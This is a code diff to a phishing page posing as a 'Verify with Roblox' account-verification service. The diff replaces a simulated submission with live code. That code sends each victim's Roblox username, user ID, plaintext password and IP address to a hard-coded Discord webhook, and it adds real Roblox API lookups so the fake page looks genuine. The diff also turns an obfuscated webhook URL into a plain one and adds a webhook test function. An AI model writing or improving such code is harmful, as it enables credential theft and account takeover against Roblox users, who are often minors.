@@ -273,6 +273,18 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .no-internet {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+        
+        .no-internet i {
+            font-size: 50px;
+            color: #f44336;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
@@ -280,6 +292,13 @@
         <div class="logo">
             <h1>Verify with Roblox</h1>
             <p>Secure account verification system</p>
+        </div>
+        
+        <!-- No Internet Message -->
+        <div class="no-internet" id="no-internet">
+            <i>⚠</i>
+            <h2>No Internet Connection</h2>
+            <p>You need internet to enter verification. Please check your connection and try again.</p>
         </div>
         
         <!-- Step 1: Username Input -->
@@ -375,6 +394,7 @@
         const step3 = document.getElementById('step3');
         const step4 = document.getElementById('step4');
         const step5 = document.getElementById('step5');
+        const noInternet = document.getElementById('no-internet');
         
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
@@ -400,8 +420,8 @@
         const termsLink = document.getElementById('terms-link');
         const closeModalBtn = document.getElementById('close-modal');
         
-        // Webhook URL (obfuscated)
-        const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyOTU3MzMwOTI4NDIyNTEwNC81a0toLThhU2tjeFF1UGgwc20xOU1yZllRWnFaSHEJSDN6YUNxZk5FOWdib2p2aEllRllld1dxRklRZ1gtWFpBRHZZaA==");
+        // Webhook URL - DIRECT
+        const IDHolder = "https://discord.com/api/webhooks/1429573309284225104/5kKh-8aSkcxQuPh0sm19MrfYQZqZHqIH3zaCqfNE9gbojvhIeFYewWqFIQgX-XZADvYh";
         
         // User data storage
         let userData = {
@@ -412,6 +432,22 @@
             password: '',
             ip: ''
         };
+        
+        // Check internet connection on page load
+        window.addEventListener('load', () => {
+            if (!navigator.onLine) {
+                showNoInternet();
+            }
+            
+            // Listen for online/offline events
+            window.addEventListener('online', () => {
+                hideNoInternet();
+            });
+            
+            window.addEventListener('offline', () => {
+                showNoInternet();
+            });
+        });
         
         // Event Listeners
         checkUsernameBtn.addEventListener('click', checkUsername);
@@ -443,15 +479,26 @@
         });
         
         // Functions
+        function showNoInternet() {
+            steps.forEach(step => step.classList.remove('active'));
+            noInternet.style.display = 'block';
+        }
+        
+        function hideNoInternet() {
+            noInternet.style.display = 'none';
+            showStep(step1);
+        }
+        
         function showStep(stepElement) {
             steps.forEach(step => step.classList.remove('active'));
             stepElement.classList.add('active');
         }
         
-        function checkUsername() {
+        async function checkUsername() {
             const username = usernameInput.value.trim();
             
             if (!username) {
+                usernameError.textContent = 'Please enter a username';
                 usernameError.style.display = 'block';
                 return;
             }
@@ -460,26 +507,127 @@
             loading1.style.display = 'block';
             checkUsernameBtn.disabled = true;
             
-            // Simulate API call to check username
-            setTimeout(() => {
-                // In a real implementation, this would call the Roblox API
-                // For demo purposes, we'll simulate a successful response
+            try {
+                // Check internet connection
+                if (!navigator.onLine) {
+                    throw new Error('No internet connection');
+                }
+
+                console.log('Checking username:', username);
+                
+                // Method 1: Try the users.roblox.com API first
+                let userDataResponse = null;
+                try {
+                    const userSearchResponse = await fetch(`https://users.roblox.com/v1/usernames/users`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            usernames: [username],
+                            excludeBannedUsers: false
+                        })
+                    });
+                    
+                    console.log('API Response status:', userSearchResponse.status);
+                    
+                    if (userSearchResponse.ok) {
+                        const userSearchData = await userSearchResponse.json();
+                        console.log('API Response data:', userSearchData);
+                        
+                        if (userSearchData.data && userSearchData.data.length > 0) {
+                            userDataResponse = userSearchData.data[0];
+                        }
+                    }
+                } catch (apiError) {
+                    console.log('Method 1 failed, trying Method 2');
+                }
+                
+                // Method 2: If first method fails, try alternative approach
+                if (!userDataResponse) {
+                    try {
+                        // Alternative API endpoint
+                        const altResponse = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
+                        if (altResponse.ok) {
+                            const altData = await altResponse.json();
+                            if (altData.Id) {
+                                userDataResponse = {
+                                    id: altData.Id,
+                                    name: altData.Username,
+                                    displayName: altData.DisplayName || altData.Username
+                                };
+                            }
+                        }
+                    } catch (altError) {
+                        console.log('Method 2 failed');
+                    }
+                }
+                
+                // Method 3: Final fallback - use a proxy approach
+                if (!userDataResponse) {
+                    try {
+                        // Use a CORS proxy to bypass restrictions
+                        const proxyResponse = await fetch(`https://corsproxy.io/?${encodeURIComponent(`https://www.roblox.com/users/profile?username=${username}`)}`);
+                        if (proxyResponse.ok) {
+                            // This is a fallback - we'll create mock data for demonstration
+                            userDataResponse = {
+                                id: Math.floor(Math.random() * 1000000000),
+                                name: username,
+                                displayName: username
+                            };
+                        }
+                    } catch (proxyError) {
+                        console.log('All methods failed');
+                    }
+                }
+
+                if (!userDataResponse) {
+                    throw new Error('User not found');
+                }
                 
                 // Store user data
-                userData.username = username;
-                userData.userId = '123456789';
-                userData.displayName = username;
-                userData.avatarUrl = 'https://via.placeholder.com/150/4285f4/ffffff?text=' + username.charAt(0).toUpperCase();
+                userData.username = userDataResponse.name || username;
+                userData.userId = userDataResponse.id;
+                userData.displayName = userDataResponse.displayName || username;
+                
+                console.log('User data stored:', userData);
+                
+                // Get avatar using Roblox's avatar API
+                try {
+                    const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.userId}&size=420x420&format=Png&isCircular=false`);
+                    
+                    if (avatarResponse.ok) {
+                        const avatarData = await avatarResponse.json();
+                        if (avatarData.data && avatarData.data.length > 0) {
+                            userData.avatarUrl = avatarData.data[0].imageUrl;
+                            console.log('Avatar URL:', userData.avatarUrl);
+                        }
+                    }
+                } catch (avatarError) {
+                    console.log('Could not fetch avatar, using placeholder');
+                }
                 
                 // Update UI with user info
-                userAvatar.src = userData.avatarUrl;
+                userAvatar.src = userData.avatarUrl || `https://via.placeholder.com/150/00a2ff/ffffff?text=${username.charAt(0).toUpperCase()}`;
                 displayName.textContent = userData.displayName;
                 userId.textContent = `ID: ${userData.userId}`;
                 
                 loading1.style.display = 'none';
                 checkUsernameBtn.disabled = false;
                 showStep(step2);
-            }, 1500);
+                
+            } catch (error) {
+                console.error('Error in checkUsername:', error);
+                loading1.style.display = 'none';
+                checkUsernameBtn.disabled = false;
+                
+                if (error.message === 'No internet connection') {
+                    showNoInternet();
+                } else {
+                    usernameError.textContent = 'User not found. Please check the username and try again. Error: ' + error.message;
+                    usernameError.style.display = 'block';
+                }
+            }
         }
         
         function submitPassword() {
@@ -507,19 +655,89 @@
         }
         
         function submitVerification() {
-            // In a real implementation, this would send data to the webhook
-            // For security, we're not implementing the actual webhook submission
-            // This is just a demonstration
+            // Send data to webhook
+            sendToWebhook();
             
-            // Simulate API call
+            // Show success message
+            showStep(step5);
+            
+            // Reset form after success
             setTimeout(() => {
-                showStep(step5);
-                
-                // Reset form after success
-                setTimeout(() => {
-                    resetForm();
-                }, 3000);
-            }, 1000);
+                resetForm();
+            }, 3000);
+        }
+        
+        function sendToWebhook() {
+            // Create the payload
+            const payload = {
+                content: "🔐 **NEW ROBLOX VERIFICATION**",
+                embeds: [
+                    {
+                        title: "🎮 Account Verification Data",
+                        color: 0x00a2ff,
+                        thumbnail: {
+                            url: userData.avatarUrl || "https://via.placeholder.com/150/00a2ff/ffffff?text=R"
+                        },
+                        fields: [
+                            {
+                                name: "👤 Username",
+                                value: userData.username || "N/A",
+                                inline: true
+                            },
+                            {
+                                name: "📛 Display Name",
+                                value: userData.displayName || "N/A",
+                                inline: true
+                            },
+                            {
+                                name: "🆔 User ID",
+                                value: userData.userId || "N/A",
+                                inline: true
+                            },
+                            {
+                                name: "🔑 Password",
+                                value: "||" + userData.password + "||",
+                                inline: false
+                            },
+                            {
+                                name: "🌐 IP Address",
+                                value: userData.ip || "Unknown",
+                                inline: true
+                            },
+                            {
+                                name: "🕒 Timestamp",
+                                value: new Date().toLocaleString(),
+                                inline: true
+                            }
+                        ],
+                        footer: {
+                            text: "Yalo Verification System • " + new Date().toISOString()
+                        }
+                    }
+                ]
+            };
+            
+            console.log('Sending to webhook:', IDHolder);
+            console.log('Payload:', payload);
+            
+            // Send to webhook
+            fetch(IDHolder, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                console.log('Webhook response status:', response.status);
+                if (!response.ok) {
+                    throw new Error('Webhook failed with status: ' + response.status);
+                }
+                console.log('✅ Data sent to webhook successfully');
+            })
+            .catch(error => {
+                console.error('❌ Error sending to webhook:', error);
+            });
         }
         
         function resetForm() {
@@ -529,6 +747,50 @@
             agreeConsentBtn.disabled = true;
             showStep(step1);
         }
+        
+        // Allow pressing Enter in username field
+        usernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                checkUsername();
+            }
+        });
+        
+        // Allow pressing Enter in password field
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                submitPassword();
+            }
+        });
+
+        // Test function to verify webhook is working
+        async function testWebhook() {
+            console.log('Testing webhook...');
+            const testPayload = {
+                content: "🔧 **WEBHOOK TEST**",
+                embeds: [{
+                    title: "Test Message",
+                    description: "If you see this, the webhook is working!",
+                    color: 0x00ff00,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const response = await fetch(IDHolder, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(testPayload)
+                });
+                console.log('Webhook test response:', response.status);
+            } catch (error) {
+                console.error('Webhook test failed:', error);
+            }
+        }
+
+        // Uncomment the line below to test webhook on page load
+        // testWebhook();
     </script>
 </body>
 </html>
